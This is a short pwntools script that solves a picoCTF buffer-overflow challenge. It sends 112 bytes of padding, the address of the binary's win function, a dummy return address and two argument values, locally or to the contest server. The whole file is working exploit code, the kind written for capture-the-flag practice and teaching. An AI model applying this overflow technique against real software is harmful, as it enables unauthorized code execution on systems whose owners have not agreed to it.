#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 61815
HOST = "saturn.picoctf.net"
exe = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x804935a
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

pl = flat(
	b'A'*112,
	exe.sym.win,
	b"AAAA",
	0xCAFEF00D,
	0xF00DF00D
	)

# GDB()
p.sendlineafter(b"string: ", pl)

p.interactive()
